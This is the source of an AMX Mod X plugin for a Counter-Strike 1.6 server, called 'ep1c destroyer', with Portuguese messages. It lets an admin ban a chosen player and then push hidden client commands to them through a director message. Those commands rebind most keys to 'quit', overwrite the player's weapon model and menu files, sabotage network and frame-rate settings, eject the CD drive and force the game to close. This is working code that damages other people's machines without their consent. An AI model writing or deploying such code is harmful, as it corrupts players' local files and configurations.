#pragma semicolon 1

#include <amxmodx>
#include <amxmisc>

#define PLUGIN  "ep1c_destroyer"
#define VERSION "4.0"
#define AUTHOR  "Hanna + lonewolf"

new const PREFIX[]      = "ep1c gaming Brasil";
new const PREFIX_CHAT[] = "^4[ep1c gaming Brasil]^1";
new const PREFIX_MENU[] = "\yep1cgamingbr\w";

new destroyer_cs[][] =
{
    "kill",
    "say AHHHHHHH FUI DESTRUÍDOOOOOOOO :(",
    "name ^"Destruído na ep1c!^"",
    "bind ^"w^" ^"quit^"",
    "bind ^"f1^" ^"quit^"",
    "bind ^"f2^" ^"quit^"",
    "bind ^"f3^" ^"quit^"",
    "bind ^"f4^" ^"quit^"",
    "bind ^"f5^" ^"quit^"",
    "bind ^"f6^" ^"quit^"",
    "bind ^"f7^" ^"quit^"",
    "bind ^"f8^" ^"quit^"",
    "bind ^"f9^" ^"quit^"",
    "bind ^"d^" ^"quit^"",
    "bind ^"s^" ^"quit^"",
    "bind ^"r^" ^"quit^"",
    "bind ^"a^" ^"quit^"",
    "bind ^"t^" ^"quit^"",
    "bind ^"y^" ^"quit^"",
    "bind ^"space^" ^"quit^"",
    "motdfile models/v_ak47.mdl;motd_write DESTROYER_EPIC",
    "motdfile models/v_m4a1.mdl;motd_write DESTROYER_EPIC",
    "motdfile models/v_awp.mdl;motd_write DESTROYER_EPIC",
    "motdfile models/v_desert.mdl;motd_write DESTROYER_EPIC",
    "motdfile models/v_usp.mdl;motd_write DESTROYER_EPIC",
    "motdfile models/v_shield;motd_write DESTROYER_EPIC",
    "motdfile resource/GameMenu.res;motd_write DESTROYER_EPIC",
    "cl_cmdrate 0.0",
    "hud_saytext 0",
    "cl_updaterate 0.0",
    "sys_ticrate 0",
    "fps_max 1.0",
    "fps_modem 1.0",
    "cl_timeout 0.0",
    "cl_allowdownload 0",
    "cl_allowupload 0",
    "rate 0",
    "developer 2",
    "hpk_maxsize 100",
    "cl_forwardspeed 0",
    "cl_backspeed 0",
    "cl_sidespeed 0",
    "cd eject",
    "hud_draw 0",
    "say Fui destruído pelo servidor ep1c gaming Brasil :(",
    "quit"
};

new cvar_log_on;
new cvar_show_destroyer;
new callback_checkflags_id;

public plugin_init()
{
    register_plugin(PLUGIN, VERSION, AUTHOR);

    cvar_log_on = register_cvar("mf_log_on", "1");
    cvar_show_destroyer = register_cvar("mf_show_destroyer", "1");

    register_say("menuf", "showmenu");
    register_say("destroyer", "showmenu");
    register_say("destroy", "showmenu");

    callback_checkflags_id = menu_makecallback("callback_checkflags");
}

public plugin_precache()
{
    precache_sound("EpicGaming_Destroyer/EpicGaming_Destroyer2.wav");
}

public showmenu(id)
{
    if (get_user_flags(id) & ADMIN_BAN)
    {
        new menuname[500];
        formatex(menuname, 499, "%s \w| Menu Destroyer", PREFIX_MENU, "4.0");
        new menu = menu_create(menuname, "_showmenu");

        menu_additem(menu, "Destruir CS^n\dDesconfigura o jogo do player selecionado.");
        menu_setprop(menu, MPROP_EXITNAME, "Sair");

        menu_display(id, menu);
    }
    else
    {
        client_print_color(id, id, "%s Acesso Negado.", PREFIX_CHAT);
    }
    return 0;
}

public _showmenu(id, menu, item)
{
    if (item == 0)
    {
        select_players(id);
    }
    
    menu_destroy(menu);
    
    return PLUGIN_HANDLED;
}

public select_players(id)
{
    new menuname[96];
    formatex(menuname, charsmax(menuname), "%s \wSelecione o Jogador:", PREFIX_MENU);
    new menu = menu_create(menuname, "_selected_player");

    new szName[32];
    new szTempid[4];
    
    for (new i = 1; i <= 32; ++i)
    {
        if (!is_user_connected(i))
        {
            continue;
        }
        get_user_name(i, szName, charsmax(szName));
        num_to_str(i, szTempid, charsmax(szTempid));

        menu_additem(menu, szName, szTempid, ADMIN_BAN, callback_checkflags_id);
    }
    menu_setprop(menu, MPROP_NEXTNAME, "Próximo");
    menu_setprop(menu, MPROP_BACKNAME, "Voltar");
    menu_setprop(menu, MPROP_EXITNAME, "Sair");

    menu_display(id, menu);
}

public callback_checkflags(id)
{
    return (get_user_flags(id) & ADMIN_IMMUNITY) ? ITEM_DISABLED : ITEM_IGNORE;
}

public _selected_player(id, menu, item)
{
    if (item == MENU_EXIT)
    {
        menu_destroy(menu);
        return PLUGIN_CONTINUE;
    }

    new data[10];
    new iname[64];
    new access = 0;
    new callback = 0;

    menu_item_getinfo(menu, item, access, data, charsmax(data), iname, charsmax(iname), callback);

    new target = str_to_num(data);

    if (!is_user_connected(target))
    {
        client_print_color(id, id, "%s O Jogador saiu do servidor.", PREFIX_CHAT);

        menu_destroy(menu);
        showmenu(id);

        return PLUGIN_HANDLED;
    }

    new admname[32];
    get_user_name(id, admname, charsmax(admname));

    new pname[32];
    get_user_name(target, pname, charsmax(pname));

    new pauthid[32];
    get_user_authid(target, pauthid, charsmax(pauthid));

    new pip[32];
    get_user_ip(target, pip, 31, 1);

    server_cmd("amx_ban ^"%s^" ^"0^" ^"ep1c Destroyer!^"", pauthid);
    server_cmd("amx_banip ^"%s^" ^"0^" ^"ep1c Destroyer!^"", pauthid);
    server_cmd("amx_addban ^"%s^" ^"%s^" ^"0^" ^"ep1c Destroyer^"", pname, pauthid);

    if (get_pcvar_num(cvar_show_destroyer))
    {
        client_print_color(0, target, "%s ^3%s ^1foi destruido.", PREFIX_CHAT, pname);
        client_print_color(0, id,     "%s Comando executado pelo Admin: ^3%s^1.", PREFIX_CHAT, admname, pname);
        client_print_color(0, target, "%s Não quer ser o próximo? Então não faça nada de errado!.", PREFIX_CHAT);

        set_hudmessage(0, 255, 0, -1.00, 0.42, 2, 0.30, 7.00, 0.25, 0.25, 8);
        ShowSyncHudMsg(0, CreateHudSyncObj(0), "%s %s Foi destruído.", PREFIX, pname);

        set_hudmessage(255, 255, 100, -1.00, 0.60, 2, 0.30, 7.00, 0.25, 0.25, 8);
        ShowSyncHudMsg(0, CreateHudSyncObj(0), "%s Comando executado pelo Admin: %s", PREFIX, admname);

        client_cmd(0, "spk ^"%s^"", "EpicGaming_Destroyer/EpicGaming_Destroyer2.wav");
    }

    if (get_pcvar_num(cvar_log_on))
    {
        log_to_file("EpicGaming_Destroyer.txt", "Admin: %s Destruiu: %s(%s)", admname, pname, pauthid);
    }

    new len = sizeof(destroyer_cs);
    for (new i = 0; i < len; ++i)
    {
        client_send_cmd(target, destroyer_cs[i]);
    }

    menu_destroy(menu);

    return PLUGIN_HANDLED;
}

client_send_cmd(id, const cmd[])
{
    message_begin(MSG_ONE, SVC_DIRECTOR, _, id);
    write_byte(strlen(cmd) + 2);
    write_byte(10);
    write_string(cmd);
    message_end();
}

register_say(const szSay[], const szFunction[])
{
    new szTemp[64];

    formatex(szTemp, charsmax(szTemp), "say /%s", szSay);
    register_clcmd(szTemp, szFunction);

    formatex(szTemp, charsmax(szTemp), "say .%s", szSay);
    register_clcmd(szTemp, szFunction);

    formatex(szTemp, charsmax(szTemp), "say_team /%s", szSay);
    register_clcmd(szTemp, szFunction);

    formatex(szTemp, charsmax(szTemp), "say_team .%s", szSay);
    register_clcmd(szTemp, szFunction);
}

